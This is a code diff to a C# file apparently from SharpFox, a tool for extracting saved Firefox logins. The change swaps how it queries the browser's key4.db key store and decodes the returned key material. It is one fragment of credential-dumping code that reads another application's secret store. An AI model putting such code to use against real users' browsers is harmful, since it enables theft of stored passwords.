@@ -1,11 +1,9 @@
 ﻿using System;
 using System.Data;
-using System.Data.SQLite;
 using System.Text;
 using SharpFox.Cryptography;
 using System.Text.RegularExpressions;
 using System.IO;
-using System.Security.AccessControl;
 using System.Security.Principal;
 using System.Security.Cryptography;
 using SharpFox.Models;
@@ -132,31 +130,20 @@ namespace SharpFox
         private static void GetItemsFromQuery(string dir, ref byte[] item1, ref byte[] item2, string query)
         {
             DataTable dt = new DataTable();
-
+        
             var db_way = dir + "\\key4.db";
-            var ConnectionString = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
-            var sql = string.Format(query);
-            using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
+            SQLiteDatabase database = new SQLiteDatabase(db_way);
+            DataTable resultantQuery = database.ExecuteQuery(query);
+        
+            int rows = resultantQuery.Rows.Count;
+            for (int i = 0; i < rows; i++)
             {
-                connect.Open();
-                using (SQLiteCommand command = new SQLiteCommand(sql, connect))
-                {
-                    SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
-                    adapter.Fill(dt);
-
-                    int rows = dt.Rows.Count;
-                    for (int i = 0; i < rows; i++)
-                    {
-                        Array.Resize(ref item2, ((byte[])dt.Rows[i][1]).Length);
-                        Array.Copy((byte[])dt.Rows[i][1], item2, ((byte[])dt.Rows[i][1]).Length);
-                        Array.Resize(ref item1, ((byte[])dt.Rows[i][0]).Length);
-                        Array.Copy((byte[])dt.Rows[i][0], item1, ((byte[])dt.Rows[i][0]).Length);
-                    }
-                    adapter.Dispose();
-                    connect.Close();
-                }
-
+                Array.Resize(ref item2, ((byte[])Convert.FromBase64String((string)resultantQuery.Rows[i][1])).Length);
+                Array.Copy(((byte[])Convert.FromBase64String((string)resultantQuery.Rows[i][1])), item2, ((byte[])Convert.FromBase64String((string)resultantQuery.Rows[i][1])).Length);
+                Array.Resize(ref item1, ((byte[])Convert.FromBase64String((string)resultantQuery.Rows[i][0])).Length);
+                Array.Copy(((byte[])Convert.FromBase64String((string)resultantQuery.Rows[i][0])), item1, ((byte[])Convert.FromBase64String((string)resultantQuery.Rows[i][0])).Length);
             }
+            database.CloseDatabase();
         }
 
         private static void Parse3Logins(string directory, string userName, string masterPassword = "")
